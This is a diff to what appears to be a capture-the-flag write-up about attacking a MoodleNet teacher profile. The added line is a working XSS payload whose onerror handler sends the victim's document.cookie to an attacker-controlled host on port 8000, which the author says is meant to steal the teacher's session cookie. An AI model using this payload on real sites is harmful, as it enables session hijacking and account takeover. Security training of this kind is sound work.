@@ -111,6 +111,8 @@ So the teacher interact with the user through moodleNet profile.
 
 The first thing came into my head that i should use xss to steal his cookie, let's try it.
 
+Payload : <img src=x onerror=this.src='http://10.10.x.x:8000/?'+document.cookie;>
+
 <img src="https://i.ibb.co/vzp7m78/xss.png" alt="xss" border="0">
 
 <img src="https://i.ibb.co/1fhZBYL/server.png" alt="server" border="0">
